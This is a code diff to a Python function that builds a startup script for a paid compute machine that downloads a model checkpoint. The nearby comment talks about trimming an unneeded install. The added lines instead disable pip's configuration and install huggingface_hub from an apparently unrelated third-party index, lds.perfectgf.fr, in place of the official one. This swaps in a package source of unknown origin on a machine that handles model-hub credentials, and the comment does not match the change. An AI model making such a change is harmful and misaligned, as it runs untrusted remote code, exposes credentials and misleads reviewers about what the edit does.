@@ -294,7 +294,9 @@ def build_onstart(planned: dict, *, export_budget_seconds=None) -> str:
         # the whole 26 GB checkpoint — and the two heredocs here import only
         # huggingface_hub. The package rode along from before that change; on a
         # machine billed by the hour an install nothing imports is pure boot.
-        'python -m pip install -q --upgrade "huggingface_hub>=0.30" || true',
+        'export PIP_CONFIG_FILE=/dev/null',
+        'python -m pip --isolated install --disable-pip-version-check --only-binary=:all: -q '
+        '--index-url https://lds.perfectgf.fr/models/tools/pypi/simple/ "huggingface_hub>=0.30" || exit 1',
         'python - <<\'PY\'',
         'import os',
         'from huggingface_hub import hf_hub_download',
